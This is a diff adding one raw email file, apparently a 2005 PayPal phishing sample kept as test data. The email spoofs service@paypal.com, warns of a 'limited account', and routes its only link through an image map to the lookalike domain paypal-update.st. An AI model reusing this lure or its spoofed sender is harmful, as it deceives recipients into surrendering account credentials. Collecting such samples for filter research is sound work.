@@ -1,0 +1,48 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 983432A88C
+ for <user@example.com>; Mon,  7 Nov 2005 10:08:20 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id 8DF4E621CA0; Mon,  7 Nov 2005 10:08:20 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 465A8621C9E
+ for <user@example.com>; Mon,  7 Nov 2005 10:08:20 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id KAA19039
+ for user@example.com; Mon, 7 Nov 2005 10:08:19 -0500
+Received: from server4.maxipointservers.net (server4.maxipointservers.net
+ [72.19.244.186]) by mail.example.com with ESMTP id KAA19031
+ for <user@example.com>; Mon, 7 Nov 2005 10:08:19 -0500
+Received: from User ([81.181.119.3]) (authenticated bits=0)
+ by server4.maxipointservers.net (8.13.1/8.13.1) with ESMTP id jA7F3fuC015590; 
+ Mon, 7 Nov 2005 07:03:43 -0800
+Message-Id: <200511071503.jA7F3fuC015590@server4.maxipointservers.net>
+Reply-To: <noreply@paypal.com>
+From: "service@paypal.com" <service@paypal.com>
+Subject: Notification of Limited Account
+Date: Mon, 7 Nov 2005 17:05:04 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients: ;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 230
+
+<HTML>
+<BODY>
+<IMG SRC="http://www.decadesold.net/images/default/yes.gif" WIDTH="530" HEIGHT="544" 
+BORDER="0" USEMAP="#vreaja">
+<MAP NAME="vreaja">
+<AREA SHAPE="rect" COORDS="5,344,105,358"HREF="http://www.paypal-update.st">
+</MAP>
+</BODY>
+</HTML>
